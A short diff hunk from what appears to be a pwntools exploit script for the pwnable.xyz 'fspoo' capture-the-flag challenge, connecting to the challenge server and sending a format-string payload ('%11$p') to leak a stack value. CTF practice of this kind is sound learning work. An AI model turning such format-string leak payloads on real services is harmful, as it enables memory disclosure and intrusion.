@@ -23,7 +23,6 @@ input_buf_offset = 0x2070
 
 ###Exploit
 r = remote('svc.pwnable.xyz',30010)
-#r = process('./fspoo',aslr=False)
 r.sendafter('Name: ','M30W')
 
 edit('a'*(0x20-7)+'%11$p')
